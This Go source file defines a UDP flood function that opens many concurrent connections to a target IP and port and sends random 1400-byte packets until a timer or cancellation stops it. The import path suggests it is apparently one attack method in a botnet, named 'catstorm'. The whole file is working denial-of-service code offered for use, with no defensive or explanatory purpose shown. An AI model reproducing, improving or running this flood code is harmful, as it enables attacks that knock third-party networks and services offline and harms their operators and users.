package l4

import (
	"context"
	"net"
	"catstorm/Bot/Methods"
)

func Udpflood(ctx context.Context, ip, port string, sec int) {
	addr := net.JoinHostPort(ip, port)
	n := methods.Workers()

	ra, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return
	}

	for i := 0; i < n; i++ {
		go func() {
			rng := methods.NewXorShift64()
			c, er := net.DialUDP("udp", nil, ra)
			if er != nil {
				return
			}
			defer c.Close()

			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 1400)
				rng.Fill(bufs[i])
			}
			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					c.Write(bufs[idx%16])
					idx++
				}
			}
		}()
	}

	<-ctx.Done()
}
